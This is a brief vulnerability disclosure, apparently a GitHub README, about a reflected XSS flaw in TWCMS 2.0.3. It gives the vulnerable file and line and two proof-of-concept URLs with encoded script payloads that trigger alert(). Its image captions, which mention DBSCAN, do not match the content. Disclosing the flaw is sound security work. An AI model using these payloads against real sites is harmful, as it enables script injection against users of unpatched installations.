There is a xss vulnerablilty on TWCMS2.0.3,the address of the TWCMS is https://github.com/kongphp/TWCMS
![image text](https://github.com/sylvieverykawaii/vulnerability/blob/main/1.png "DBSCAN Performance Comparison")
![image text](https://github.com/sylvieverykawaii/vulnerability/blob/main/2.png "DBSCAN Performance Comparison")
On line 24 of "/TWCMS-gh-pages/twcms/runtime/twcms_view/default,index.htm.php" PHP directly echoes parameters input from external sources, triggering an xss vulnerability.
The POC is http://localhost/twcms-gh-pages/index.php?keyword=1&mid=2%27%22()%26%25%3Cacx%3E%3CScRiPt%20%3Ealert(9678)%3C/ScRiPt%3E&u=search-index
http://localhost/twcms-gh-pages/index.php?keyword=1&mid=%22%3Cacx%3E%3Cscript%3Ealert(/12345/)%3C/script%3E&u=search-index
![image text](https://github.com/sylvieverykawaii/vulnerability/blob/main/3.png "DBSCAN Performance Comparison")
